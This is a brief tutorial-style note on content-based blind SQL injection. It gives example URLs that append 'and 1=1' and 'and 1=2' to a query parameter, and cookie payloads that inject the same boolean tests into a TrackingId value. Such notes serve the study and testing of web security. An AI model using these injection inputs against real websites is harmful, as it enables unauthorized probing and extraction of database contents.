# Content-based (true or false)

```
# http://newspaper.com/items.php?id=2
SELECT title, description, body FROM items WHERE ID = 2

#http://newspaper.com/items.php?id=2 and 1=2
SELECT title, description, body FROM items WHERE ID = 2 and 1=2

# If the web application is vulnerable to SQL Injection, then it probably will not return 
anything & To make sure, the attacker will inject a query that will return ‘true’:
 
http://newspaper.com/items.php?id=2 and 1=1


```

partical

<br>

```applescript
# condition is true or false
Cookie: TrackingId=Dc89p84m1aHFWyU9'+and+1=1--;
# condition is false time
Cookie: TrackingId=Dc89p84m1aHFWyU9'+and+1=2--;
```
